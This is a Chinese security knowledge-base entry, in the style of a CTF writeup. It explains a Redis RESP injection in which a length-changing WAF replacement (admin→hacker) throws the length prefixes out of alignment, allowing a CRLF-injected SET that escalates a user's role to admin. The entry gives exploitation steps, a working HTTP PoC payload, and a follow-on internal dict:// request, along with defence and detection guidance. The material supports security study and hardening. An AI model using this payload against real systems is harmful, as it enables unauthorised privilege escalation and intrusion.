---
id: web-generic-crlf-redis-resp-length-shift-waf-bypass-role-escalation
title: 应用把用户输入拼进 RESP 命令写 Redis，WAF 变长替换（admin→hacker）打乱 $len 长度字段：CRLF 注入整条 SET 改写 role 为 admin
type: scenario
domain: web
path: web/generic/crlf
technique: redis-resp-length-shift-waf-replacement-injection
aliases:
- Redis RESP 长度错位注入
- WAF 替换变长 协议注入
- admin 换 hacker 字符串逃逸
- SET 命令注入 role admin
- 注册接口越权提权
tags:
- redis
- resp
- injection
- waf-bypass
- length-shift
- privilege-escalation
- nodejs
- crlf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:43:00+08:00'
  notes: 已对照原文核对：SET 拼接先算 $len、waf 做 admin→hacker 变长替换导致长度错位，N 个 admin + %0D%0A 填充后整条 SET 被 Redis 当新命令执行、写出 user:5934020060 且 role 为 admin，payload 与原文完全一致（图02-03）；未验证点：原文未说明具体偏移对齐细节，PoC 中省略了 admin 重复次数
---

## 一句话结论

注册接口把用户名直接拼进 Redis 的 RESP 命令（`SET user:<name> <json>`）并手工写 `$<len>` 长度前缀，而"防护"函数是对最终字符串做 `replace("admin","hacker")`——每个 `admin` 会多出 1 个字符，使先前算好的长度字段与实际内容错位；攻击者提交大量 `admin` 加 `%0D%0A`（即真实 CRLF），就能让错位后的剩余字节被 Redis 当成新的一行/新的 RESP 数组解析，从而额外注入一条自己的 `SET user:<id> {"role":"admin"}`，把自己创建的用户提权为管理员。

## 原理

- **RESP 协议由长度前缀驱动**：客户端发 `*3\r\n$3\r\nSET\r\n$15\r\nuser:5934020060\r\n$52\r\n{...json...}\r\n` 时，Redis 按 `$<len>` 精确读取后面 `len` 个字节作为参数，长度与实际字节必须一致。
- **拼接点上先算长度、后做替换**：应用先按"原始用户名 + JSON"算出各段长度写进命令串，再交给 waf 函数做 `admin→hacker` 替换。替换发生在长度计算之后，`hacker` 比 `admin` 长 1 字节，于是声明长度比真实内容短，协议解析在读取 `$len` 个字节后停在"内容中间"，后面的字节被当作下一段/下一条命令的起始。
- **错位如何变成注入**：攻击者在用户名里塞 N 个 `admin` 使偏移量达到可控值，再用 `%0D%0A`（URL 解码后是真实 CRLF）把攻击者希望的"新命令行"推到错位后的边界上，凭 `$1\r\n1\r\n` 之类填充把长度对齐，最后接 `*3\r\n$3\r\nSET\r\n$15\r\nuser:<id>\r\n$52\r\n<JSON>\r\n`。Redis 读到的就是两条完整命令：原本的 `user:hacker...` 键，以及攻击者指定的 `user:<id>` = `{"password":"...","role":"admin"}`。
- **为什么危害落在"越权"而不是"仅脏数据"**：业务注册逻辑只允许把新用户 role 设为 `noBody`，但攻击者改写的第二条 SET 直接把 `role` 写成 `admin`；随后用该账号登录就拿到 admin 才有的能力（原文中 admin 可调 `cmd` 参数执行 curl，进而打内网 Redis）。
- **为什么是"WAF 反而制造漏洞"**：`replace` 型过滤只关心"敏感词是否还在"，不关心它改变了字节长度；对长度敏感的下游协议（RESP、序列化、multipart boundary）而言，任何变长替换都可能把数据变成指令。同类问题在 PHP 序列化字符逃逸里也成立。
- 精确条件：替换方向必须是"短→长"（每处 +1，或至少方向固定且可计算）；攻击者要能控制被替换词的出现次数以精确调整偏移；协议层（Redis）必须按长度前缀解析而不能容忍多余字节。

## 触发条件

- 应用把用户可控字段拼进 RESP 命令（或任何带显式长度前缀的协议）写入 Redis，并手工计算 `$<len>` 而不是用客户端库的 `SET` 方法。
- 拼接后存在变长的"安全替换/过滤"（如 `admin→hacker`），且替换在长度计算之后执行。
- 注册/更新接口不需要管理员权限，且攻击者能通过参数注入 CRLF（`%0D%0A`）。
- 应用用同一份 Redis 数据做鉴权（如 `user:<id>` 的 JSON 里含 `role`），且下游有仅 admin 可用的功能。

## 利用步骤

1. 用普通账号注册，抓注册请求，确认参数（如 `username`、`password`）被拼进 Redis 写入命令；在 Redis 里 `keys *` 观察键名格式 `user:<id>`。
2. 判定替换方向：提交 `username=admin`，看 Redis 键是否变成 `hacker`（确认替换存在且为短→长）。
3. 探测协议注入：提交 `username=adminadmin` + `%0D%0A` + 若干填充，观察是否出现额外键或报协议错误（能注入则会出现"预期外"的键）。
4. 精确调偏移：用 N 个 `admin` 让 `$len` 与实际内容的差值抵消，填入 `$1\r\n1\r\n` 之类对齐填充，让错位边界正好落在 `*3` 之前。
5. 注入完整 SET：`*3\r\n$3\r\nSET\r\n$<idlen>\r\nuser:<id>\r\n$<jsonlen>\r\n{"password":"...","role":"admin"}\r\n`，提交后 `GET user:<id>` 确认 `role` 为 `admin`。
6. 用该账号登录，访问仅 admin 可用的功能（如带 `cmd` 参数的命令执行/内网请求接口），把权限升级为实际危害。

## PoC

```http
GET /login?username=adminadmin...(重复 N 个)...%0D%0A$1%0D%0A1%0D%0A%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$15%0D%0Auser%3A5934020060%0D%0A$52%0D%0AeyJwYXNzd29yZCI6ICJleHBleHAiLCAicm9sZSI6ICJhZG1pbiJ9%0D%0A%0D%0A%0D%0A&password=123 HTTP/1.1
Host: target
```

解码后等价的注入片段：

```text
username = "admin" × N + "\r\n$1\r\n1\r\n\r\n*3\r\n$3\r\nSET\r\n$15\r\nuser:5934020060\r\n$52\r\n{\"password\":\"expexp\",\"role\":\"admin\"}\r\n\r\n\r\n"
```

校验（在目标 Redis 上，仅授权测试）：

```text
127.0.0.1:6379> keys *
1) "user:5934020060"
2) "user:hackerhacker...hacker"
127.0.0.1:6379> get user:5934020060
"{\"password\":\"expexp\",\"role\":\"admin\"}"
```

```text
# 用注入出来的 admin 账号登录后，调用仅 admin 可用的接口
/login?username=5934020060&password=expexp&cmd=dict://127.0.0.1:6379/info
```

## 变体与关联

- 变体：替换词与方向任意（`'`→`''`、敏感词删除导致变短同样能错位，只是偏移方向反过来）；只要"先算长度、后改长度"就成立。
- 变体：目标协议换成 multipart boundary、HTTP `Content-Length`、Java 序列化、protobuf 长度前缀——凡是指令与数据共用长度字段的格式都适用。
- 关联：[[web-php-deserialization-str-replace-length-shortening-escape]]（同为变长替换导致结构逃逸，利用点是 PHP 反序列化属性边界）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（Redis inline 协议与 CRLF 注入基础）、[[pentest-initial-access-redis-master-slave-rogue-server-rce]]（拿到 admin 后继续打 Redis 主从复制）。
- 边界：改用 Redis 客户端库（`jedis`/`redis-py`/`ioredis` 的 `SET` 方法，内部自行 RESP 编码）后该链失效；WAF 改为等长替换或直接拒绝、或替换在长度计算之前完成，也不再错位。

## 检测与防御

- 修复：不要手工拼 RESP；用客户端库的参数化 `SET`，把用户名/JSON 作为独立参数交给库编码。
- 修复：过滤不要做变长替换。命中敏感词直接拒绝请求，或做等长遮蔽；对长度敏感的下游输入必须拒绝 CRLF 与控制字符（`%0D`/`%0A`/`%00`）。
- 审计：搜索 `replace(`、`strip`、`waf(` 等对"待写入协议内容"的后处理；确认长度计算发生在所有变换之后。
- 检测：注册/更新请求参数中出现大量重复敏感词、`%0D%0A`、`\r\n$`、`*3`、`$len` 形态；Redis 出现非业务写入的键（尤其 `user:<未知 id>`）；同一来源短时间内出现"注册后立即以 admin 身份调用高权接口"。
